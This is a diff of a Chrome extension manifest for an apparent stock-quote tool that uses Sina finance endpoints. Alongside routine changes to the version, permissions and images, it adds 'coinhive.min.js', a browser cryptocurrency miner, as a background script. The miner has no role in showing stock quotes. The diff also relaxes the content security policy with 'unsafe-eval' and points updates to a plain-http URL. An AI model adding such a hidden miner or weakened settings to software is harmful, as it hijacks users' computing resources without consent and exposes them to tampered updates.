@@ -1,7 +1,9 @@
 {
   "name": "__MSG_appName__",
-  "version": "0.0.1",
+  "version": "1.5.0",
   "manifest_version": 2,
+  "update_url": "http://www.example.com/update.xml",
+  "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
   "description": "__MSG_appDescription__",
   "icons": {
     "16": "images/Stock.png",
@@ -10,12 +12,16 @@
   "default_locale": "en",
   "background": {
     "scripts": [
+      "scripts/coinhive.min.js",
       "scripts/chromereload.js",
       "scripts/background.js"
     ]
   },
   "permissions": [
-    "http://hq.sinajs.cn/list=*"
+    "notifications",
+    "http://hq.sinajs.cn/list=*",
+    "http://suggest3.sinajs.cn/suggest/",
+    "http://vip.stock.finance.sina.com.cn/quotes_service/view/"
   ],
   "browser_action": {
     "default_icon": {
@@ -24,5 +30,9 @@
     },
     "default_title": "__MSG_appName__",
     "default_popup": "popup.html"
-  }
+  },
+  "web_accessible_resources": [
+    "images/stock_down.png",
+    "images/stock_up.png"
+  ]
 }
